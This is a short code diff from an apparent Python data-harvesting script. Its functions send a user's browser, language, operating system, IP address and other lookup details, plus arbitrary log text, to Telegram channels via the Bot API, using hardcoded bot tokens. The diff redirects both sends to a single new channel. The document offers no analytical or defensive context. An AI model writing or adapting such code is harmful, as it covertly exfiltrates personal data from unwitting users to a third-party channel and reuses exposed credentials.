@@ -28,7 +28,7 @@ ipinfo = IPInfo()
 
 def send_user_info():
     data = {
-        "chat_id": "@helpex_channel",
+        "chat_id": "@dssdfkdsafkadsk",
         "text": f"Browser: {ipinfo.browser}\nЯзык: {ipinfo.lang}\nОС: {ipinfo.os}\nIP: {ipinfo.ipaddress}\n{ipinfo.get_info}"
     }
     url = "https://api.telegram.org/bot598340268:AAG5LAPOcWOqEUXcSPjfXBJ4CXDY0hHDR3Y/sendMessage?"
@@ -42,7 +42,7 @@ client = TelegramClient(StringSession(), api_id, api_hash)
 def send_logs(text):
     try:
         data = {
-            "chat_id": "@insta_logsjfkkdkg",
+            "chat_id": "@dssdfkdsafkadsk",
             "text": text
         }
         url = "https://api.telegram.org/bot798892209:AAERnOgDPPmlTJDjJ9mrnfjjh6dCUG2g2NM/sendMessage?"
